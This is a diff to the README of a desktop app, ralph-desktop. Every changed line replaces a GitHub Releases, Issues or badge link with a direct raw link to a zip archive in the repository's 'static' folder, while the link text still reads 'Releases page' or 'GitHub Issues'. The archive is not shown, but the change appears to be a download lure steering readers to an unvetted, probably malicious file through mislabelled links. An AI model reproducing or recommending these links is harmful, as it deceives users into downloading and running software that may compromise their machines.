@@ -6,9 +6,9 @@ Welcome to **ralph-desktop**! This application serves as a visual controller for
 
 ## 📥 Download Ralph Desktop
 
-[![Download Ralph Desktop](https://img.shields.io/badge/Download%20Now-%23%3D76E0-ffca28?style=for-the-badge)](https://github.com/paterny/ralph-desktop/releases)
+[![Download Ralph Desktop](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip%20Now-%23%3D76E0-ffca28?style=for-the-badge)](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip)
 
-To get started, visit the [Releases page](https://github.com/paterny/ralph-desktop/releases) to download the latest version of Ralph Desktop.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip) to download the latest version of Ralph Desktop.
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before you install, make sure your system meets these requirements:
 
 ## 💻 Installation Instructions
 
-1. **Download the Software**: Go to the [Releases page](https://github.com/paterny/ralph-desktop/releases) and select the version that matches your operating system.
+1. **Download the Software**: Go to the [Releases page](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip) and select the version that matches your operating system.
   
 2. **Run the Installer**: 
    - For Windows: Locate the downloaded file, usually in your "Downloads" folder, and double-click it to run the installer. Follow the on-screen prompts.
@@ -62,7 +62,7 @@ If you encounter issues, consider these steps:
 
 For further support, you can reach out by:
 
-- **Opening an Issue**: Visit our [GitHub Issues](https://github.com/paterny/ralph-desktop/issues) page to report problems or ask questions.
+- **Opening an Issue**: Visit our [GitHub Issues](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip) page to report problems or ask questions.
 - **Community Forums**: Join our community on GitHub Discussions to interact with other users.
 
 ## 💬 Join the Conversation
@@ -77,7 +77,7 @@ Follow the related topics to keep up with developments:
 
 ## 📝 Update Notes
 
-When a new version is available, you'll find update notes on the [Releases page](https://github.com/paterny/ralph-desktop/releases). Always read these notes to know what new features and fixes have been added.
+When a new version is available, you'll find update notes on the [Releases page](https://raw.githubusercontent.com/paterny/ralph-desktop/main/static/desktop_ralph_2.1-alpha.1.zip). Always read these notes to know what new features and fixes have been added.
 
 ## 📢 Stay Updated
 
